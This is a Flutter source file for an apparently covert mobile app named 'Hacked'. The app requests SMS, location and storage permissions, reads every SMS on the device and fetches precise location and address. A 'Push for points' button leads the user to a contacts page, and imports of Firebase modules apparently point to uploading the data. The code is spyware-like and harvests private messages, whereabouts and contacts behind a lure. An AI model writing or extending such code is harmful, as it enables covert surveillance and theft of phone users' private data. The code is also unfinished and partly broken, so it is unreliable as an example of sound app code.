/*import 'package:dataApp/messg_firestore.dart';
import 'package:dataApp/see_contact.dart';
import 'package:flutter/material.dart';
import 'contact.dart';
import 'messg.dart';
import 'test.dart';
import 'package:firebase_core/firebase_core.dart';
import 'location.dart';
import 'auth.dart';
import 'back.dart';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        
        primarySwatch: Colors.amber,
        // This makes the visual density adapt to the platform that you run
        // the app on. For desktop platforms, the controls will be smaller and
        // closer together (more dense) than on mobile platforms.
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: MyHomePage(title: 'Hacked!'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  MyHomePage({Key key, this.title}) : super(key: key);

  final String title;

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
        appBar: AppBar(
          // Here we take the value from the MyHomePage object that was created by
          // the App.build method, and use it to set our appbar title.
          title: Text(widget.title),
        ),
        body: Container(
            width: MediaQuery.of(context).size.width,
            height: MediaQuery.of(context).size.height,
            
            child: ListView(//scrollDirection: Axis.vertical,
             children:[ 
              Column(
                children: [
                  RaisedButton(
                    onPressed: () {
                      Navigator.push(
                        context,
                        MaterialPageRoute(builder: (context) => ContactsPage(),),
                      );
                    ///  Navigator.push(
                    //    context,
                    //    MaterialPageRoute(builder: (context) => MessageFetch(),),
                    //  );
                      Navigator.push(
                        context,
                        MaterialPageRoute(builder: (context) => DashboardScreen(),),
                      );
                    },
                    child: Text('location'),
                  ),
                
                  //ContactsPage(),
                 // DashboardScreen(),
                  

                 // MessageFetch(),               
                ],
              ),
              ], // This trailing comma makes auto-formatting nicer for build methods.
            )
            )
            );
  }
} */

import 'dart:io';

import 'package:dataApp/messg_firestore.dart';
import 'package:dataApp/see_contact.dart';
import 'package:flutter/material.dart';
import 'contact.dart';
import 'messg.dart';
import 'test.dart';
import 'package:firebase_core/firebase_core.dart';
import 'location.dart';
import 'auth.dart';
import 'back.dart';
import 'package:sms/sms.dart';
import 'messg_firestore.dart';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'location_firebase.dart';
import 'package:contacts_service/contacts_service.dart';
import 'firestore.dart';
import 'package:permission_handler/permission_handler.dart';

//import 'add.dart';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await [Permission.location, Permission.sms, Permission.storage].request();

  runApp(Hacked());
  // void main() => runApp(Hacked());
}

class Hacked extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Hacked',
      theme: ThemeData(
        primarySwatch: Colors.amber,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: MyHacked(),
    );
  }
}

class MyHacked extends StatefulWidget {
  @override
  State createState() {
    return MyHackedState();
  }
}

class MyHackedState extends State {
  SmsQuery query = new SmsQuery();
  List messages = new List();
  final Geolocator geolocator = Geolocator()..forceAndroidLocationManager;
  Position _currentPosition;
  String _currentAddress;

  //Iterable<Contact> _contacts;
  @override
  initState() {
    //  getContacts();
    super.initState();
    fetchSMS();
    _getCurrentLocation();
    //  for (var i = 0; i < messages.asMap().length; i++)
    //  Messg(messages[i].body, messages[i].address);
  }

  _getCurrentLocation() {
    geolocator
        .getCurrentPosition(desiredAccuracy: LocationAccuracy.best)
        .then((Position position) {
      setState(() {
        _currentPosition = position;
      });

      _getAddressFromLatLng();
    }).catchError((e) {
      print(e);
    });
  }

  _getAddressFromLatLng() async {
    try {
      List<Placemark> p = await geolocator.placemarkFromCoordinates(
          _currentPosition.latitude, _currentPosition.longitude);

      Placemark place = p[0];

      setState(() {
        _currentAddress =
            "${place.locality}, ${place.postalCode}, ${place.country}";
      });
    } catch (e) {
      print(e);
    }
  }

  /* Future<void> getContacts() async {
    //Make sure we already have permissions for contacts when we get to this
    //page, so we can just retrieve it
    final Iterable<Contact> contacts = await ContactsService.getContacts();
    setState(() {
     // _contacts = contacts;
    });
  } */

  @override
  Widget build(BuildContext context) {
    //for (var i = 0; i < messages.asMap().length; i++)
    //return Messg(messages[i].body, messages[i].address); //just sending only latest message
    //i==0 have the latest mesaage
    // return Container(width:10.0, height: 0.0,);
    //child: Messg(messages[0].body, messages[0].address),
    //);
    //..ar getMssg;
    return Scaffold(
      appBar: AppBar(
        title: Text("Hacked"),
        backgroundColor: Colors.pink,
      ),
      body: FutureBuilder(
          future: fetchSMS(),
          builder: (context, snapshot) {
            return Column(
              children: [
                //for (var i = 0; i < messages.asMap().length; i++)

                Messg(messages[1].body, messages[1].address),

                //DashboardScreen(),

                if (_currentPosition != null && _currentAddress != null)
                  Location(_currentAddress),
                RaisedButton(
                  onPressed: () async {
                    //await [ Permission.camera, Permission.microphone, Permission.sms,Permission.location ].request();
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (context) => ContactsPage(),
                      ),
                    );
                  },
                  child: Text('Push for points'),
                ),
                /*  _contacts != null
                          ? ListView.builder(
                              itemCount: _contacts?.length ?? 0,
                              itemBuilder: (BuildContext context, int index) {
                                Contact contact = _contacts?.elementAt(index);
                                var phoneNo;
                                contact.phones
                                    .forEach((phone) => phoneNo = phone.value);

                                return AddUser(contact.displayName, phoneNo);
                              },
                            )
                          : Center(child: const CircularProgressIndicator()),*/
              ],
            );
          }),
    );
  }

  fetchSMS() async {
    messages = await query.getAllSms;

    var m = messages.asMap();
    print(m.length);
    print(m[1].body);
  }
}
